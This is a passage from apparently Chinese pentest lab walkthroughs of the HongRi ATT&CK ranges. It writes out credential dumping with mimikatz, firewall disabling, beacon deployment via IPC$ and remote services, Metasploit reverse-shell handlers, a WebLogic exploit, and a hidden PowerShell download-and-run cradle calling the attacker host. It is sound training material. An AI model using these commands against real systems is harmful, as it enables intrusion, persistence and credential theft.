<p>\u901a\u8fc7kali\u81ea\u5e26\u7684proxychains4\u8fdb\u884c\u4ee3\u7406,\u76f4\u63a5\u62ff\u4e0b\u57df\u63a7\uff1a</p> <p><code>/etc/proxychains.conf</code>\u8981\u914d\u7f6e\u6b63\u786e</p> <pre><code>cat /etc/proxychains.conf     \n</code></pre> <p></p> <pre><code>\u2514\u2500# proxychains4 python3 psexec.py god.org/administrator:hongrisec@2020@192.168.52.138\n</code></pre> <p></p> <p>\u6ce8\uff1a\u7531\u4e8e\u8fd9\u91cc\u7684\u7f16\u7801\u5b58\u5728\u95ee\u9898\uff0c\u4e00\u5b9a\u8981\u6267\u884c<code>chcp 65001</code>\u540e\u5728\u8fdb\u884c\u5176\u4ed6\u64cd\u4f5c\u3002</p>"},{"location":"CTF/HTB/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA1/index.html#2-3389","title":"2. \u5f00\u542f3389\u7aef\u53e3","text":"<pre><code>REG ADD HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal\" \"Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f\n</code></pre> <p>\u5f00\u542f\u7aef\u53e3\u540e\u53d1\u73b0\u4e0d\u80fd\u8fdc\u7a0b\u8fde\u63a5\uff0c\u67e5\u770b\u4e00\u4e0b\u9632\u706b\u5899\u7684\u72b6\u6001<code>netsh advfirewall show allprofiles</code>\u679c\u7136\u90fd\u5f00\u7740\uff0c</p> <p></p> <p>\u76f4\u63a5\u7ed9\u5b83\u5173\u6389<code>netsh advfirewall set allprofiles state off</code></p> <p></p>"},{"location":"CTF/HTB/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA1/index.html#3_2","title":"3.\u8fdc\u7a0b\u8fde\u63a5","text":"<p>\u6210\u529f\u767b\u5f55\u5230\u57df\u63a7(win7\u8fdc\u7a0b\u8fde\u63a5DC,\u800c\u4e0d\u662fkali)</p> <p></p> <p>\u76f4\u63a5\u4e0a\u4f20mimikatz\uff0c\u901a\u8fc7dcsync\u6293\u53d6\u6240\u6709\u7528\u6237\u7684hash(\u5728\u62ff\u4e0b\u7b2c\u4e00\u53f0\u673a\u5668\u7684\u65f6\u5019\u5c31\u53ef\u505a\u6b64\u64cd\u4f5c\uff0c\u56e0\u4e3a\u5c31\u76f4\u63a5\u62ff\u5230\u57df\u7ba1\u7684\u6743\u9650\u7684\u4e86),\u4ee5\u4fbf\u540e\u7eed\u505a\u6743\u9650\u7ef4\u6301<code>lsadump::dcsync /all /csv</code></p>"},{"location":"CTF/HTB/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA1/index.html#4ipc","title":"4.\u5185\u7f51\u6e17\u900f(IPC$)","text":"<p>\u4ec0\u4e48\u662fIPC$\uff1a</p> <p>IPC( Internet ProcessConnection)\u5171\u4eab\u201c\u547d\u540d\u7ba1\u9053\u201d\u7684\u8d44\u6e90\uff0c\u662f\u4e3a\u4e86\u5b9e\u73b0\u8fdb\u7a0b\u95f4\u901a\u4fe1\u800c\u5f00\u653e\u7684\u547d\u540d\u7ba1\u9053\u3002IPC\u53ef\u4ee5\u901a\u8fc7\u9a8c\u8bc1\u7528\u6237\u540d\u548c\u5bc6\u7801\u83b7\u5f97\u76f8\u5e94\u7684\u6743\u9650\uff0c\u901a\u5e38\u5728\u8fdc\u7a0b\u7ba1\u7406\u8ba1\u7b97\u673a\u548c\u67e5\u770b\u8ba1\u7b97\u673a\u7684\u5171\u4eab\u8d44\u6e90\u65f6\u4f7f\u7528\u3002</p> <p>\u901a\u8fc7ipc$\uff0c\u53ef\u4ee5\u4e0e\u76ee\u6807\u673a\u5668\u5efa\u7acb\u8fde\u63a5\u3002\u5229\u7528\u8fd9\u4e2a\u8fde\u63a5\uff0c\u4e0d\u4ec5\u53ef\u4ee5\u8bbf\u95ee\u76ee\u6807\u673a\u5668\u4e2d\u7684\u6587\u4ef6\uff0c\u8fdb\u884c\u4e0a\u4f20\u3001\u4e0b\u8f7d\u7b49\u64cd\u4f5c\uff0c\u8fd8\u53ef\u4ee5\u5728\u76ee\u6807\u673a\u5668\u4e0a\u8fd0\u884c\u5176\u4ed6\u547d\u4ee4\uff0c\u4ee5\u83b7\u53d6\u76ee\u6807\u673a\u5668\u7684\u76ee\u5f55\u7ed3\u6784\u3001\u7528\u6237\u5217\u8868\u7b49\u4fe1\u606f\u3002</p> <p></p>"},{"location":"CTF/HTB/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA1/index.html#1csrun-mimikatz","title":"1.cs\u91cc\u9762\u9009\u62e9run mimikatz\u8bfb\u53d6\u76ee\u6807\u4e3b\u673a\u8d26\u53f7\u5bc6\u7801","text":""},{"location":"CTF/HTB/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA1/index.html#2ipcipc","title":"2.\u5efa\u7acbIPC$\u7684\u7ba1\u9053\u7b26\uff08\u9700\u8981\u7ba1\u7406\u5458\u624d\u80fd\u5efa\u7acbIPC\uff09","text":"<pre><code>shell net use \\\\192.168.52.138\\ipc$ \"hongrisec@2020\" /user:god\\administratorh\n</code></pre> <p>\u8868\u793a\u548c192.168.52.138\u5efa\u7acbipc$\u7ba1\u9053\uff0c\u7528\u5bc6\u7801hongrisec@2020\uff0c\u7528god\\administrator\u8d26\u53f7</p> <p></p> <p>\u67e5\u770bIPC$\u7ba1\u9053\u662f\u5426\u5efa\u7acb\u6210\u529f\uff1a</p> <pre><code>shell net use\n</code></pre> <p></p> <p>\u5982\u679c\u628a\u6728\u9a6c\u6587\u4ef6\u4e0a\u4f20\u5230\u57df\u63a7\u6267\u884c\uff0c\u9ed1\u5ba2\u662f\u6ca1\u6cd5\u8bbf\u95ee\u5230\u57df\u63a7\u7684\uff0c\u56e0\u4e3a\u7f51\u7edc\u4e0d\u901a.</p> <p></p> <p>\u6240\u4ee5\u8fd9\u91cc\u6211\u4eec\u9700\u8981\u642d\u5efa\u4e00\u4e2a\u96a7\u9053\uff0c\u5728web\u670d\u52a1\u5668\u548c\u57df\u63a7\u4e2d\u95f4\u5efa\u7acb\u4e00\u4e2a\u6d41\u91cf\u96a7\u9053(IPC$\u53ea\u80fd\u4f20\u6587\u4ef6\uff0c\u96a7\u9053\u53ef\u4ee5\u4f20\u6d41\u91cf)</p> <p></p> <p>\u5982\u4f55\u4e0a\u7ebf\u4e0d\u51fa\u7f51\u7684\u673a\u5668?\u8fd9\u91cc\u6211\u4eec\u4f7f\u7528CS\u81ea\u5e26\u7684\u529f\u80fd\uff0c\u8fdb\u884c\u5185\u7f51\u7a7f\u900f\u5b9e\u9a8c.</p> <p>SMB Beacon\u4f7f\u7528\u547d\u540d\u7ba1\u9053\u901a\u8fc7\u7236\u7ea7</p> <p>Beacon\u8fdb\u884c\u901a\u8baf\uff0c\u5f53\u4e24\u4e2aBeacons\u8fde\u63a5\u540e\uff0c\u5b50Beacon\u4ece\u7236Beacon\u83b7\u53d6\u5230\u4efb\u52a1\u5e76\u53d1\u9001\u3002</p> <p></p>"},{"location":"CTF/HTB/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA1/index.html#3webipc","title":"3.web\u670d\u52a1\u5668\u901a\u8fc7IPC\u4f20\u7ed9\u57df\u63a7\u6728\u9a6c","text":"<p>\u65b0\u5efa\u4e00\u4e2a\u76d1\u542c\u5668</p> <p></p> <p>\u9009\u62e9\u653b\u51fb\u65b9\u5f0f</p> <p></p> <p>\u9009\u62e9\u6587\u4ef6\u7ba1\u7406\uff0cupload\u521a\u521a\u7684.exe\u6587\u4ef6</p> <p></p> <p>\u5c06beacon.exe\u590d\u5236\u5230\u57df\u63a7\u4e3b\u673a\u7684c\u76d8\uff1a</p> <pre><code>shell copy beacon.exe \\\\192.168.52.138\\C$\n</code></pre> <p></p>"},{"location":"CTF/HTB/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA1/index.html#4ipc_1","title":"4.\u901a\u8fc7IPC\u521b\u5efa\u670d\u52a1\u5e26\u52a8\u6728\u9a6c\u8fd0\u884c","text":"<p>\u521b\u5efa\u4e00\u4e2a\u670d\u52a1\uff0c\u670d\u52a1\u4e00\u65e6\u8fd0\u884c\uff0c\u5c31\u4f1a\u8fd0\u884cc\u76d8\u4e0b\u7684\u6076\u610f\u6728\u9a6c\uff1a</p> <pre><code>shell sc \\\\owa.god.org create test1 binpath= \"cmd.exe /c c:\\beacon.exe\"\n</code></pre> <p>\u5229\u7528 sc \u547d\u4ee4\u884c\u5de5\u5177 \uff0c \u8bd5\u56fe\u5728\u8fdc\u7a0b\u8ba1\u7b97\u673a owa.god.org \u4e0a\u521b\u5efa\u4e00\u4e2a\u540d\u4e3a test1 \u7684\u670d\u52a1\uff0c\u8be5\u670d\u52a1\u7684\u529f\u80fd\u662f\u6267\u884c c:\\beacon.exe\u3002</p> <p>\u663e\u793a\u670d\u52a1\u521b\u5efa\u6210\u529f</p> <p></p> <p>\u5f00\u542f\u670d\u52a1\uff1a</p> <pre><code>shell sc \\\\owa.god.org start test1\n</code></pre> <p></p>"},{"location":"CTF/HTB/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA1/index.html#5smb","title":"5.\u6728\u9a6c\u8d70SMB\u6d41\u91cf","text":"<p>\u8fde\u63a5\u76ee\u6807\u673a\u5668\uff08\u5fc5\u987b\u4e3b\u52a8\u8fde\u63a5)\uff1a</p> <pre><code>link owa.god.org\n</code></pre> <p></p> <p>\u76ee\u6807\u4e3b\u673a\u4e0a\u7ebf\uff0csystem\u6743\u9650</p> <p></p>"},{"location":"CTF/HTB/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA1/index.html#_8","title":"\u6d41\u7a0b\u68b3\u7406\uff1a","text":"<p>\u9ed1\u5ba2\u901a\u8fc7cs\u628a\u6728\u9a6c\u4f20\u5165web\u670d\u52a1\u5668-&gt;web\u670d\u52a1\u5668\u901a\u8fc7IPC\u4f20\u7ed9\u57df\u63a7-&gt;\u901a\u8fc7IPC\u521b\u5efa\u670d\u52a1\uff0c\u670d\u52a1\u8fd0\u884c\u5e26\u52a8\u6728\u9a6c\u8fd0\u884c-&gt;\u6728\u9a6c\u8d70SMB\u6d41\u91cf\uff08\u7ecf\u8fc7web\u670d\u52a1\u5668\u4f20\u7ed9\u9ed1\u5ba2\uff0c\u9ed1\u5ba2\u5c31\u53ef\u4ee5\u901a\u8fc7\u8fd9\u6761\u8def\u628a\u91cc\u9762\u7684\u57df\u63a7\u63a7\u5236\uff09-&gt;\u6700\u540e\uff0c\u5220\u65e5\u5fd7\uff08\u5185\u7f51\u6e17\u900f\u62ff\u4e0b\u57df\u63a7\u5c31\u7ed3\u675f\u4e86\uff09</p>"},{"location":"CTF/HTB/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA2/index.html","title":"\u7ea2\u65e5ATT&amp;CK\u7cfb\u5217\u9776\u573a\uff08\u4e8c\uff09","text":"<ul> <li>\u9776\u573a\u5730\u5740:http://cloud-pentest.cn/index.html#</li> <li>\u9776\u673a\u4e0b\u8f7d\u5730\u5740\uff1ahttps://pan.baidu.com/s/1QlkyFALPCZADUQevFYf_2A?pwd=hqxi\uff08\u63d0\u53d6\u7801\uff1ahqxi\uff09</li> <li>\u865a\u62df\u673a\u5bc6\u7801\uff1a1qaz@WSX</li> <li>\u7f51\u7edc\u62d3\u6251\uff1a</li> </ul> <ul> <li>\u9776\u673a\u4fe1\u606f\u6982\u89c8\uff1a</li> </ul> \u673a\u5668 IP \u7528\u6237\u540d WEB.de1ay.com 192.168.111.80 / 10.10.10.80 DE1AY/mssql WEB/de1ay PC.de1ay.com 192.168.111.201 / 10.10.10.201 DE1AY/mssql DE1AY/krbtgt PC/de1ay DC.de1ay.com 10.10.10.10 DE1AY/de1ay kali 192.168.111.168 root <p>cao\uff0c\u914d\u73af\u5883\u592a\u4e0d\u5bb9\u6613\u4e86\u3002\u6ce8\u610fWEB\u9700\u8981\u624b\u52a8\u5f00\u542f7001\u670d\u52a1\uff0c\u5728 C:\\Oracle\\Middleware\\user_projects\\domains\\base_domain\\bin \u4e0b\u6709\u4e00\u4e2a startWeblogic \u7684\u6279\u5904\u7406\uff0c\u7ba1\u7406\u5458\u8eab\u4efd\u8fd0\u884c\u5b83\u5373\u53ef\uff0c\u7ba1\u7406\u5458\u8d26\u53f7\u5bc6\u7801\uff1aAdministrator/1qaz@WSX</p> <p></p>"},{"location":"CTF/HTB/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA2/index.html#0x01","title":"0x01 \u4fe1\u606f\u6536\u96c6","text":"<p>\u5bf9\u6240\u5728\u7f51\u6bb5\u8fdb\u884c\u57fa\u7840\u626b\u63cf</p> <p></p> <p></p> <p>\u53d1\u73b0\u4e24\u4e2a\u5b58\u6d3b\u4e3b\u673a192.168.111.80\u548c192.168.111.201</p> <p>\u8fd9\u91cc\u6211\u4eec\u6ce8\u610f\u5230192.168.111.80\u662f\u5b58\u5728\u4e24\u4e2ahttp\u670d\u52a1\uff0880\u7aef\u53e3\u7684IIS\u548c7001\u7aef\u53e3\u7684weblogic\uff09</p> <ul> <li>\u8bbf\u95ee192.168.111.80:80\u662f\u4e2a\u7a7a\u767d\u9875\u9762</li> <li>\u8bbf\u95ee192.168.111.80:7001\uff0c404\u62a5\u9519</li> </ul> <p></p>"},{"location":"CTF/HTB/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA2/index.html#nmap-19216811180","title":"Nmap - 192.168.111.80","text":"<p>\u62ff\u5230\u73af\u5883\u540e\uff0c\u9996\u5148\u8fdb\u884c\u7aef\u53e3\u63a2\u6d4b\uff0c\u8fd9\u91cc\u4f7f\u7528-sS\u53c2\u6570\uff0c\u7531\u4e8e\u9632\u706b\u5899\u7684\u5b58\u5728\u4e0d\u80fd\u4f7f\u7528icmp\u5305\uff0c\u6240\u4ee5\u4f7f\u7528syn\u5305\u63a2\u6d4b</p> <p></p> <p>\u901a\u8fc7\u626b\u63cf\u7aef\u53e3\uff0c\u6211\u4eec\u901a\u8fc7\u7aef\u53e3\u521d\u6b65\u5224\u65ad\u76ee\u6807\u673a\u5b58\u5728\u7684\u670d\u52a1\u53ca\u53ef\u80fd\u5b58\u5728\u7684\u6f0f\u6d1e\uff0c\u5982445\u7aef\u53e3\u5f00\u653e\u5c31\u610f\u5473\u7740\u5b58smb\u670d\u52a1\uff0c\u5b58\u5728smb\u670d\u52a1\u5c31\u53ef\u80fd\u5b58\u5728ms17-010/\u7aef\u53e3\u6ea2\u51fa\u6f0f\u6d1e\u3002\u5f00\u653e139\u7aef\u53e3\uff0c\u5c31\u5b58\u5728Samba\u670d\u52a1\uff0c\u5c31\u53ef\u80fd\u5b58\u5728\u7206\u7834/\u672a\u6388\u6743\u8bbf\u95ee/\u8fdc\u7a0b\u547d\u4ee4\u6267\u884c\u6f0f\u6d1e\u3002\u5f00\u653e1433\u7aef\u53e3\uff0c\u5c31\u5b58\u5728mssql\u670d\u52a1\uff0c\u53ef\u80fd\u5b58\u5728\u7206\u7834/\u6ce8\u5165/SA\u5f31\u53e3\u4ee4\u3002\u5f00\u653e3389\u7aef\u53e3\uff0c\u5c31\u5b58\u5728\u8fdc\u7a0b\u684c\u9762\u3002\u5f00\u653e7001\u7aef\u53e3\u5c31\u5b58\u5728weblogic\u3002</p>"},{"location":"CTF/HTB/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA2/index.html#-19216811180","title":"\u76ee\u5f55\u626b\u63cf - 192.168.111.80","text":"<p>\u5bf9\u8fd9\u4e24\u4e2a\u7ad9\u70b9\u8fdb\u884c\u76ee\u5f55\u626b\u63cf</p> <p></p> <p></p>"},{"location":"CTF/HTB/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA2/index.html#0x02","title":"0x02 \u5916\u56f4\u6253\u70b9","text":"<p>\u8bbf\u95ee\u66b4\u9732\u7684192.168.111.80:7001\u7684/console\u8def\u7531\uff0c\u7ed3\u679c\u90fd\u662f\u8df3\u8f6c\u5230http://192.168.111.80:7001/console/login/LoginForm.jsp</p> <p></p> <p>\u5c1d\u8bd5\u53ef\u80fd\u5b58\u5728\u7684\u5f31\u53e3\u4ee4\u4e4b\u540e\u4f9d\u65e7\u6ca1\u6709\u7ed3\u679c\uff0c\u5c1d\u8bd5weblogic\u5e38\u89c1Nday\u5229\u7528\u3002</p> <p>\u5de5\u5177\u5730\u5740\uff1ahttps://github.com/rabbitmask/WeblogicScan</p> <pre><code>python3 WeblogicScan.py -u 192.168.111.80 -p 7001\n</code></pre> <p></p> <p>\u4f7f\u7528hyacinth-Java\u53cd\u5e8f\u5217\u5316\u6f0f\u6d1e\u68c0\u6d4b\u5de5\u5177</p> <p>\u5de5\u5177\u5730\u5740\uff1ahttps://github.com/pureqh/Hyacinth</p> <p></p> <p>\u770b\u5230\u5b58\u5728\u591a\u4e2ajava\u53cd\u5e8f\u5217\u5316\u6f0f\u6d1e\uff0c\u5c1d\u8bd5\u5229\u7528CVE-2017-10271</p> <p></p> <p>\u4f7f\u7528\u51b0\u874e\u6210\u529f\u8fde\u63a5 </p> <p></p> <p></p> <p>\u51b0\u874e\u6210\u529f\u4e0a\u7ebf\uff0c\u53d6\u5f97webshell\u6743\u9650\uff0c\u4f46webshell\u53ef\u80fd\u968f\u65f6\u88ab\u53d1\u73b0\u6e05\u9664\uff0c\u9700\u8fdb\u4e00\u6b65\u6743\u9650\u7ef4\u6301\u3002\u8fd9\u91cc\u7684\u601d\u8def\u662f\u5c06shell\u6d3e\u9001\u7ed9CS\u6216\u8005msf\u8fdb\u884c\u540e\u6e17\u900f\u3002</p> <p>\u6267\u884c\u547d\u4ee4systeminfo\u53d1\u73b0\u8be5\u4e3b\u673a\u662fwin2008</p> <p></p> <p>\u6267\u884c\u547d\u4ee4tasklist /v\uff0c\u67e5\u770bWindows\u5f53\u524d\u8fdb\u7a0b\uff0c\u53d1\u73b0\u5b58\u5728360\u6740\u8f6f(\u6ca1\u6709\u7684\u8bdd\uff0c\u81ea\u5df1\u5f00\u542f360\u670d\u52a1)</p> <p></p> <p>\u4e3b\u673a\u4e0a\u5b58\u5728360\uff0c\u6211\u4eec\u76f4\u63a5\u4e0a\u4f20\u5e76\u6267\u884cmsf\u751f\u6210\u7684\u540e\u95e8\uff0c\u57fa\u672c\u662f\u4f1a\u88ab360\u67e5\u6740\u7684</p>"},{"location":"CTF/HTB/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA2/index.html#0x03","title":"0x03\u00a0\u7ed5\u8fc7\u6740\u8f6f+\u6743\u9650\u7ef4\u6301\u4e0e\u63d0\u5347","text":"<p>\u6211\u4eec\u8fd9\u91cc\u5176\u5b9e\u53ef\u4ee5\u4e0d\u7528\u6298\u817e\u53bb\u505a\u9759\u6001\u6216\u52a8\u6001\u514d\u6740\uff0c\u53ef\u4ee5\u7528\u4e0b\u5217\u51e0\u79cd\u65b9\u6cd5\u7ed5\u8fc7360\u5e76\u4e0a\u7ebf\uff1a</p>"},{"location":"CTF/HTB/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA2/index.html#31","title":"3.1 \u7ed5\u8fc7\u6740\u8f6f\u3001\u7ef4\u6301\u6743\u9650","text":""},{"location":"CTF/HTB/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA2/index.html#1msf","title":"\uff081\uff09\u65b9\u6cd5\u4e00\uff1a\u4f7f\u7528\u51b0\u874e\u76f4\u63a5\u4e0a\u7ebfmsf","text":"<p>kali\u4e0a\u542f\u52a8msf\uff0c\u5e76\u914d\u7f6ehandler\u76d1\u542c</p> <pre><code>msfconsole\nuse exploit/multi/handler\nset payload java/meterpreter/reverse_tcp\nset lhost 0.0.0.0\nset lport 2333\nexploit\n</code></pre> <p>\u7136\u540e\u51b0\u874e\u53bb\u6267\u884c\u53cd\u5f39shell\u7684\u8fde\u63a5\uff0cmsf\u5373\u53ef\u4e0a\u7ebf\u6210\u529f</p> <p></p> <p></p>"},{"location":"CTF/HTB/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA2/index.html#2msfweblogicexp","title":"\uff082\uff09\u65b9\u6cd5\u4e8c\uff1a\u4f7f\u7528msf\u4e2dweblogic\u53cd\u5e8f\u5217\u5316\u6f0f\u6d1e\u7684exp\u53bb\u6253","text":"<pre><code>use exploit/multi/misc/weblogic_deserialize_asyncresponseservice\nset rhosts 192.168.111.80\nset lhost 192.168.111.128\nset target 1                # \u9ed8\u8ba4\u65f6unix\uff0c\u800c\u6211\u4eec\u76ee\u6807\u662fWindows\nset payload windows/meterpreter/reverse_http # \u6216 windows/x64/meterpreter/reverse_http\nexploit\n</code></pre> <p>\u8fd9\u91cc\u8981\u6ce8\u610f\u4e24\u70b9\uff0c\u4e00\u662f\u8be5\u6a21\u5757target\u9ed8\u8ba4\u4e3aunix\uff0c\u6211\u4eec\u9700\u8981\u5c06target\u6539\u6210windows\uff1b\u4e8c\u662f\u53ef\u80fd\u56e0\u4e3a\u7f51\u7edc\u539f\u56e0\uff0csession\u4e0d\u80fd\u6bcf\u6b21\u90fd\u6210\u529f\u521b\u5efa\uff0c\u5982\u679c\u65e0\u6cd5\u521b\u5efasession\u5c31\u591arun\u51e0\u6b21\u8bd5\u8bd5\u3002</p> <p></p>"},{"location":"CTF/HTB/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA2/index.html#3webpowershellcs","title":"\uff083\uff09\u65b9\u6cd5\u4e09\uff1a\u4f7f\u7528web\u6295\u9012powershell\u4e0a\u7ebfcs","text":"<p>\u6ce8\uff1a\u8be5\u9776\u673a\u4e0d\u51fa\u7f51\uff0c\u6240\u4ee5\u8fd9\u91cc\u65e0\u6cd5\u4f7f\u7528vps\u4e0a\u7ebfCS\u3002</p> <p>\u9996\u5148\u521b\u5efabeacon http\u76d1\u542c\u5668</p> <p></p> <p>\u7136\u540e\u8fdb\u884cweb\u6295\u9012</p> <p></p> <p></p> <pre><code>powershell.exe -nop -w hidden -c \"IEX ((new-object net.webclient).downloadstring('http://192.168.111.128:80/a'))\"\n</code></pre> <p>\u5728\u51b0\u874e\u91cc\u6267\u884c\u751f\u6210\u7684\u547d\u4ee4\u5373\u53ef\u4e0a\u7ebfcs</p> <p></p> <p></p>"},{"location":"CTF/HTB/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA2/index.html#32","title":"3.2 \u6743\u9650\u63d0\u5347","text":"<p>\u603b\u4e4b\uff0c\u4e0a\u7ebf\u6210\u529f\u540e\uff0c\u5c1d\u8bd5\u63d0\u6743\uff0c\u901a\u8fc7msf\u76f4\u63a5\u63d0\u6743\u4e0d\u6210\u529f\uff0c\u7531\u4e8e\u662fwin2008\uff0c\u56e0\u6b64\u76f4\u63a5\u4f7f\u7528MS14-058\u63d0\u6743\uff0c\u7528\u7684\u4ee5\u4e0b\u5de5\u5177\uff1a<code>https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS14-058</code>\u53ef\u4ee5\u3002\u4e0d\u8fc7\u8fd9\u91cc\u66f4\u5feb\u7684\u65b9\u6cd5\u662f\u5148\u6d3e\u53d1\u7ed9cs\uff0c\u5728cs\u4e0a\u76f4\u63a5\u5c31\u80fd\u63d0\u6743\u6210\u529f\u4e86\u3002</p> <p>ms14-058 \u63d0\u5230 system \u6743\u9650</p> <p></p> <p></p> <p></p> <p>\u7136\u540e\u6211\u4eec\u518d\u5c06cs\u63d0\u6743\u540e\u7684shell\u6d3e\u751f\u5230msf\uff0c\u7528msf\u641c\u96c6\u5185\u7f51\u4fe1\u606f\u6bd4\u8f83\u65b9\u4fbf\u3002</p> <p>\u9996\u5148msf\u521b\u5efa\u4e00\u4e2ahandler\u76d1\u542c\u5668\uff0c\u76d1\u542c\u672c\u57308001\u7aef\u53e3\uff0c\u7528\u7684payload\u662fwindows/meterpreter/reverse_http</p> <p></p> <pre><code>use exploit/multi/handler\nset lhost 192.168.111.128\nset lport 8001\nset payload windows/meterpreter/reverse_http\nrun\n</code></pre> <p>\u7136\u540ecs\u4e2d\u65b0\u5efa\u4e00\u4e2a\u76d1\u542c\u5668\uff0c\u9009\u62e9payload\u4e3aforeign http</p> <p></p> <p>\u5728\u63d0\u6743\u540e\u7684\u4f1a\u8bdd\u4e0a\u65b0\u5efa\u4e00\u4e2a\u4f1a\u8bdd</p> <p></p> <p>\u6210\u529f\u5728msf\u4e2d\u4e0a\u7ebf</p> <p></p> <p>\u9677\u9631\u5224\u65ad</p> <pre><code>dir\u6216ls # \u67e5\u770b\u76ee\u5f55\nrun post/windows/gather/checkvm # \u5224\u65ad\u9776\u673a\u662f\u5426\u8fdb\u5165\u871c\u7f50\nrun post/windows/gather/enum_applications # \u5217\u4e3e\u5b89\u88c5\u7a0b\u5e8f\n</code></pre> <p></p> <p>\u6253\u5f003389\u7aef\u53e3</p> <pre><code>run post/windows/manage/enable_rdp\n</code></pre> <p></p> <p></p>"},{"location":"CTF/HTB/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA2/index.html#0x04","title":"0x04 \u5185\u7f51\u4fe1\u606f\u6536\u96c6","text":"<pre><code>ipconfig /all   \u67e5\u770b\u672c\u673aip\uff0c\u6240\u5728\u57df\nroute print     \u6253\u5370\u8def\u7531\u4fe1\u606f\nnet view        \u67e5\u770b\u5c40\u57df\u7f51\u5185\u5176\u4ed6\u4e3b\u673a\u540d\narp -a          \u67e5\u770barp\u7f13\u5b58\nnet start       \u67e5\u770b\u5f00\u542f\u4e86\u54ea\u4e9b\u670d\u52a1\nnet share       \u67e5\u770b\u5f00\u542f\u4e86\u54ea\u4e9b\u5171\u4eab\nnet share ipc$  \u5f00\u542fipc\u5171\u4eab\nnet share c$    \u5f00\u542fc\u76d8\u5171\u4eab\nnet config Workstation   \u67e5\u770b\u8ba1\u7b97\u673a\u540d\u3001\u5168\u540d\u3001\u7528\u6237\u540d\u3001\u7cfb\u7edf\u7248\u672c\u3001\u5de5\u4f5c\u7ad9\u3001\u57df\u3001\u767b\u5f55\u57df\nnet user                 \u67e5\u770b\u672c\u673a\u7528\u6237\u5217\u8868\nnet time /domain        #\u67e5\u770b\u65f6\u95f4\u670d\u52a1\u5668\uff0c\u5224\u65ad\u4e3b\u57df\uff0c\u4e3b\u57df\u670d\u52a1\u5668\u90fd\u505a\u65f6\u95f4\u670d\u52a1\u5668\nnet user /domain         \u67e5\u770b\u57df\u7528\u6237\nnet localgroup administrators   \u67e5\u770b\u672c\u5730\u7ba1\u7406\u5458\u7ec4\uff08\u901a\u5e38\u4f1a\u6709\u57df\u7528\u6237\uff09\nnet view /domain         \u67e5\u770b\u6709\u51e0\u4e2a\u57df\nnet user \u7528\u6237\u540d /domain   \u83b7\u53d6\u6307\u5b9a\u57df\u7528\u6237\u7684\u4fe1\u606f\nnet group /domain        \u67e5\u770b\u57df\u91cc\u9762\u7684\u5de5\u4f5c\u7ec4\uff0c\u67e5\u770b\u628a\u7528\u6237\u5206\u4e86\u591a\u5c11\u7ec4\uff08\u53ea\u80fd\u5728\u57df\u63a7\u4e0a\u64cd\u4f5c\uff09\nnet group \u7ec4\u540d /domain    \u67e5\u770b\u57df\u4e2d\u67d0\u5de5\u4f5c\u7ec4\nnet group \"domain admins\" /domain  \u67e5\u770b\u57df\u7ba1\u7406\u5458\u7684\u540d\u5b57\nnet group \"domain computers\" /domain  \u67e5\u770b\u57df\u4e2d\u7684\u5176\u4ed6\u4e3b\u673a\u540d\nnet group \"doamin controllers\" /domain  \u67e5\u770b\u57df\u63a7\u5236\u5668\uff08\u53ef\u80fd\u6709\u591a\u53f0\uff09\n</code></pre> <p>\u67e5\u770b\u7f51\u7edc\u914d\u7f6e\u4fe1\u606f\uff1a</p> <pre><code>shell ipconfig -all\n</code></pre> <p>\u53d1\u73b0\u5b58\u5728\u57dfde1ay.com\uff0c\u5185\u7f51\u7f51\u6bb5\u662f10.10.10.0/24\uff0c\u8fdb\u4e00\u6b65\u6839\u636eDNS\u670d\u52a1\u5668\u53ef\u4ee5\u5224\u65ad\u57df\u63a7\u662f10.10.10.10</p> <p></p> <p>\u67e5\u770b\u8ba1\u7b97\u673a\u540d\u3001\u5168\u540d\u3001\u7528\u6237\u540d\u3001\u7cfb\u7edf\u7248\u672c\u3001\u5de5\u4f5c\u7ad9\u3001\u57df\u3001\u767b\u5f55\u57df\uff1a</p> <pre><code>shell net config workstation\n</code></pre> <p></p> <p>\u67e5\u8be2\u57df\u5185\u7528\u6237\uff1a</p> <pre><code>net user /domain\n</code></pre> <p></p> <p>\u67e5\u8be2\u57df\u63a7\uff1a</p> <pre><code>net group \"domain controllers\" /domain\n</code></pre> <p></p> <p>\u67e5\u770b\u57df\u4e2d\u7684\u5176\u4ed6\u4e3b\u673a\u540d\uff1a</p> <pre><code>net group \"domain computers\" /domain\n</code></pre> <p></p> <p>\u67e5\u770b\u57df\u7ba1\u7406\u5458\u7684\u540d\u5b57\uff1a</p> <pre><code>net group \"domain admins\" /domain\n</code></pre> <p></p> <p>ping\u4e00\u4e0bDC\u548cPC\u8fd9\u4e24\u53f0\u4e3b\u673a\uff0c\u62ff\u5230\u5176\u5185\u7f51ip:</p> <p></p> <p>\u5185\u7f51\u4e3b\u673a\u4fe1\u606f\u5c0f\u7ed3\uff1a</p> <ul> <li>10.10.10.10 \uff0cDC\uff0c\u57df\u63a7</li> <li>10.10.10.201\uff0cPC\uff0c\u57df\u4e3b\u673a</li> <li>110.10.10.80\uff0cWEB\uff0c\u57df\u4e3b\u673a2</li> </ul> <p>\u63a5\u4e0b\u6765\u76f4\u63a5cs\u91cc\u4f7f\u7528\u7684portscan 